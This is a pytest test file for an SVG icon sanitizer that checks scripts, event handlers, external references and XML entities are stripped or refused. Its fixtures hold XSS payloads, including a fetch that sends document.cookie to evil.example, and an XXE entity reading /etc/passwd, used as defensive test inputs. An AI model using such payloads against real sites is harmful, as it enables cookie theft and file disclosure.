"""The vector copy an SVG icon keeps: rebuilt from an allowlist, never passed through.

What these pin down is the promise the library makes when it keeps an SVG's shapes to
draw them inline in a page: nothing that can run, fetch or reach outside survives the
cleaning, every allowed shape and paint does, and a copy that would not draw what the PNG
draws is not kept at all.
"""

import re

import pytest

from azimut.engine import iconvector

NS = 'xmlns="http://www.w3.org/2000/svg"'
XLINK = 'xmlns:xlink="http://www.w3.org/1999/xlink"'
SQUARE = '<path d="M2 2h20v20H2z" fill="#123456"/>'


@pytest.fixture(autouse=True)
def _fresh_cache():
    """Each test reads its files afresh: a limit patched in one is not cached for the next."""
    iconvector._clean.cache_clear()
    yield
    iconvector._clean.cache_clear()


def svg(inner: str, attributes: str = "") -> str:
    return f'<svg {NS} {XLINK} viewBox="0 0 24 24"{attributes}>{inner}</svg>'


#: Every way an SVG has been known to carry a script, a fetch or a reach outside, each
#: beside a square that must come through untouched.
HOSTILE = {
    "script element": svg(f"<script>alert(document.cookie)</script>{SQUARE}"),
    "script in a CDATA": svg(f"<script><![CDATA[fetch('https://evil.example/'+document.cookie)]]></script>{SQUARE}"),
    "event attribute on a shape": svg('<path d="M2 2h20v20H2z" fill="#123456" onclick="alert(1)" onmouseover="alert(2)"/>'),
    "event attribute on the root": svg(SQUARE, ' onload="alert(1)"'),
    "event attribute on a group": svg(f'<g onfocusin="alert(1)" tabindex="0">{SQUARE}</g>'),
    "foreignObject": svg('<foreignObject width="24" height="24"><iframe xmlns="http://www.w3.org/1999/xhtml" '
                         f'src="javascript:alert(1)"/></foreignObject>{SQUARE}'),
    "use to outside": svg(f'<use xlink:href="https://evil.example/sprite.svg#a"/><use href="https://evil.example/b.svg#b"/>{SQUARE}'),
    "use inside": svg(f'<defs><path id="a" d="M0 0h1v1z"/></defs><use href="#a"/>{SQUARE}'),
    "image with a data URL": svg(f'<image href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" width="24" height="24"/>{SQUARE}'),
    "image with a script URL": svg(f'<image xlink:href="javascript:alert(1)" width="24" height="24"/>{SQUARE}'),
    "link around a shape": svg(f'<a href="javascript:alert(1)" xlink:href="https://evil.example/" target="_top">{SQUARE}</a>'),
    "style element": svg(f"<style>@import url(https://evil.example/x.css); path {{ fill: url(https://evil.example/f) }}</style>{SQUARE}"),
    "style attribute with URLs": svg('<path d="M0 0h4v4z" fill="#123456" style="fill:url(https://evil.example/a);'
                                     f'background:url(javascript:alert(1));behavior:url(x.htc)"/>{SQUARE}'),
    "paint by URL": svg(f'<path d="M0 0h4v4z" fill="url(#g)" stroke="url(https://evil.example/s)"/>{SQUARE}'),
    "paint by data URL": svg(f'<path d="M0 0h4v4z" fill="data:text/html,alert(1)"/>{SQUARE}'),
    "clip, mask and filter by reference": svg(f'<path d="M0 0h4v4z" clip-path="url(#c)" mask="url(#m)" filter="url(#f)"/>{SQUARE}'),
    "animation that sets a link": svg('<a><set attributeName="href" to="javascript:alert(1)"/>'
                                      f'<animate attributeName="onload" values="alert(1)"/>{SQUARE}</a>'),
    "nested svg with onload": svg(f'<svg onload="alert(1)" viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>{SQUARE}'),
    "a path value that tries to close its quote": svg('<path d="M0 0&quot; onload=&quot;alert(1)" fill="#000"/>' + SQUARE),
    "transform that is no transform": svg(f'<g transform="url(javascript:alert(1))">{SQUARE}</g>'),
    "processing instruction": '<?xml-stylesheet href="https://evil.example/x.css" type="text/css"?>' + svg(SQUARE),
    "comment holding a script": svg(f"<!-- <script>alert(1)</script> -->{SQUARE}"),
    "xml:base and namespaced attributes": svg(f'<g xml:base="https://evil.example/" xlink:title="x">{SQUARE}</g>'),
    "an editor's own namespace": svg(f'<x:script xmlns:x="https://evil.example/ns">alert(1)</x:script>{SQUARE}'),
    "text drawn with a link": svg(f'<text x="0" y="10"><a href="javascript:alert(1)">click</a></text>{SQUARE}'),
}

#: What none of the cleaned copies may hold.
FORBIDDEN = re.compile(r"script|javascript|href|url\(|data:|evil|foreignObject|<use|<image|<style|<set|<animate|"
                       r"<text|<svg|<!|@import|behavior|\son[a-z]+=|xml:|xlink", re.I)


@pytest.mark.parametrize("name", list(HOSTILE))
def test_nothing_that_can_run_fetch_or_reach_outside_survives(name):
    cleaned = iconvector.clean(HOSTILE[name])
    assert cleaned is not None, name
    assert not FORBIDDEN.search(cleaned.body), (name, cleaned.body)
    assert cleaned.document() == f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">{cleaned.body}</svg>'
    assert '<path d="M2 2h20v20H2z" fill="#123456"/>' in cleaned.body, name


@pytest.mark.parametrize("name", ["use to outside", "use inside", "image with a data URL", "style element",
                                  "style attribute with URLs", "paint by URL", "clip, mask and filter by reference", "foreignObject",
                                  "text drawn with a link", "nested svg with onload"])
def test_a_copy_that_lost_part_of_its_drawing_is_not_kept(name):
    assert iconvector.clean(HOSTILE[name]).whole is False


@pytest.mark.parametrize("name", ["script element", "event attribute on a shape", "event attribute on the root",
                                  "link around a shape", "comment holding a script", "an editor's own namespace",
                                  "processing instruction"])
def test_what_draws_nothing_is_dropped_and_the_copy_kept(name):
    assert iconvector.clean(HOSTILE[name]).whole is True


@pytest.mark.parametrize("text", [
    '<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]>'
    f'<svg {NS} viewBox="0 0 24 24"><path d="M0 0h1v1z"/><desc>&b;</desc></svg>',
    f'<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg {NS} viewBox="0 0 24 24"><desc>&x;</desc>'
    '<path d="M0 0h1v1z"/></svg>',
    f'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg {NS} '
    'viewBox="0 0 24 24"><path d="M0 0h1v1z"/></svg>',
])
def test_a_doctype_or_an_entity_refuses_the_whole_file(text):
    assert iconvector.clean(text) is None


@pytest.mark.parametrize("text", [
    "<html><body><svg></svg></body></html>",
    '<svg xmlns="https://evil.example/" viewBox="0 0 24 24"><path d="M0 0h1v1z"/></svg>',
    f'<svg {NS}><path d="M0 0h1v1z"/></svg>',
    f'<svg {NS} viewBox="0 0 0 24"><path d="M0 0h1v1z"/></svg>',
    f'<svg {NS} viewBox="0 0 24 24"><title>Nothing drawn</title></svg>',
    "not xml at all",
    "",
])
def test_what_is_no_drawing_gives_no_copy(text):
    assert iconvector.clean(text) is None


def test_every_allowed_shape_and_paint_is_kept():
    text = svg(
        '<g transform="translate(1 2) rotate(10)" opacity="0.9" fill-rule="evenodd">'
        '<path d="M2 2L8 2 8 8Z" fill="#ff0000" stroke="#00f" stroke-width="1.5" stroke-linecap="round"'
        ' stroke-linejoin="round" fill-opacity="0.5"/>'
        '<circle cx="12" cy="12" r="3" fill="rgb(0, 128, 0)"/>'
        '<ellipse cx="5" cy="18" rx="3" ry="2" fill="navy"/>'
        '<rect x="14" y="14" width="6" height="4" rx="1" ry="1" stroke="black" fill="none"/>'
        '<line x1="0" y1="23" x2="24" y2="23" stroke="#333" stroke-dasharray="2 1"/>'
        '<polyline points="1,1 3,4 5,1" fill="none" stroke="#444"/>'
        '<polygon points="20,1 23,6 17,6" fill="#abc"/>'
        "</g>", ' fill="#222" stroke-miterlimit="4"')
    cleaned = iconvector.clean(text)
    assert cleaned is not None and cleaned.whole
    assert cleaned.view == (0.0, 0.0, 24.0, 24.0)
    for kept in ('<g fill="#222" stroke-miterlimit="4">', 'transform="translate(1 2) rotate(10)"', 'opacity="0.9"',
                 'fill-rule="evenodd"', '<path d="M2 2L8 2 8 8Z" fill="#ff0000" stroke="#00f" stroke-width="1.5"',
                 'stroke-linecap="round"', 'fill-opacity="0.5"', '<circle cx="12" cy="12" r="3" fill="rgb(0, 128, 0)"/>',
                 '<ellipse cx="5" cy="18" rx="3" ry="2" fill="navy"/>', 'rx="1" ry="1" stroke="black" fill="none"',
                 '<line x1="0" y1="23" x2="24" y2="23" stroke="#333" stroke-dasharray="2 1"/>',
                 '<polyline points="1,1 3,4 5,1"', '<polygon points="20,1 23,6 17,6" fill="#abc"/>'):
        assert kept in cleaned.body, kept


def test_a_style_attribute_is_read_for_its_paint_and_an_editors_leftovers_cost_nothing():
    text = (f'<svg {NS} xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" viewBox="0 0 10 10" width="10mm">'
            '<metadata>x</metadata><g inkscape:label="Layer 1" style="display:inline">'
            '<path id="p1" class="cls" style="fill:#ff0000;stroke:none;font-family:Arial;paint-order:normal" '
            'fill="#000" d="M1 1h4v4z"/></g></svg>')
    cleaned = iconvector.clean(text)
    assert cleaned.whole
    assert cleaned.body == '<g><path fill="#ff0000" d="M1 1h4v4z" stroke="none"/></g>'


def test_current_colour_is_the_colour_the_drawing_names_else_black():
    cleaned = iconvector.clean(svg('<g color="#00ff00"><path d="M0 0h4v4z" fill="currentColor"/></g>'
                                   '<path d="M5 5h4v4z" stroke="currentColor" fill="none"/>'))
    assert 'fill="#00ff00"' in cleaned.body and 'stroke="#000000"' in cleaned.body


def test_what_is_hidden_is_left_out():
    cleaned = iconvector.clean(svg(f'<path d="M0 0h4v4z" display="none"/><g style="visibility:hidden">'
                                   f'<path d="M5 5h1v1z"/></g>{SQUARE}'))
    assert cleaned.body == SQUARE


def test_the_size_is_bounded_in_bytes_elements_and_depth(monkeypatch):
    long_path = svg(f'<path d="M0 0{"h1" * (iconvector.MAX_SOURCE_BYTES // 2)}"/>')
    assert iconvector.clean(long_path) is None
    monkeypatch.setattr(iconvector, "MAX_ELEMENTS", 50)
    assert iconvector.clean(svg(SQUARE * 60)) is None
    assert iconvector.clean(svg(SQUARE * 40)) is not None
    deep = svg("<g>" * (iconvector.MAX_DEPTH + 1) + SQUARE + "</g>" * (iconvector.MAX_DEPTH + 1))
    assert iconvector.clean(deep) is None
    monkeypatch.setattr(iconvector, "MAX_VECTOR_BYTES", 100)
    iconvector._clean.cache_clear()
    assert iconvector.clean(svg(SQUARE * 4)) is None


def test_a_copy_is_cut_to_the_ink_and_reads_back_the_same():
    cleaned = iconvector.cropped(iconvector.clean(svg(SQUARE)), (0.25, 0.5, 0.75, 1.0))
    assert cleaned.view == (6.0, 12.0, 12.0, 12.0)
    again = iconvector.clean(cleaned.document())
    assert again == cleaned


def test_a_silhouette_takes_one_colour_and_keeps_what_is_not_painted():
    body = iconvector.clean(svg('<g fill="none" stroke="#000"><path d="M0 0h4v4z" fill="#123"/>'
                                '<path d="M5 5h1v1z" fill="transparent"/><path d="M9 9h1v1z"/></g>')).body
    tinted = iconvector.tinted(body, "#eb6834")
    assert tinted.startswith('<g fill="#eb6834">')
    assert 'fill="none" stroke="#eb6834"' in tinted and 'd="M0 0h4v4z" fill="#eb6834"' in tinted
    assert 'fill="transparent"' in tinted and "#123" not in tinted and '"#000"' not in tinted
    assert iconvector.tinted(body, 'red" onload="x').startswith('<g fill="#888888">')
